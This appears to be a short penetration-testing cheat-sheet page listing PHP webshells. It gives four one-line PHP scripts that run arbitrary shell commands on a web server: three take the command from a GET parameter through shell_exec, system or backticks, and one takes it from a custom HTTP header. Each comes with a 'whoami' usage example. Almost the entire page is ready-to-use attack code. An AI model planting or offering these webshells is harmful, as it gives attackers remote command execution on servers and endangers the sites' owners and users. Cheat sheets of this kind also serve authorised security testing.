---
description: PHP Webshells
---

# PHP

### Basic (GET) PHP Webshells

```php
<?php echo shell_exec($_GET['eee']); ?> //webshell.php?eee=whoami
```

```php
<?php echo system($_GET['eee']); ?> //webshell.php?eee=whoami
```

```php
<?=`$_GET[_]`;?> //webshell.php?_=whoami
```

### Using custom HTTP header

```php
<?php echo system($_SERVER['HTTP_OAK1']); ?> 
//visit webshell.php with a customer header "OAK1: whoami"
```
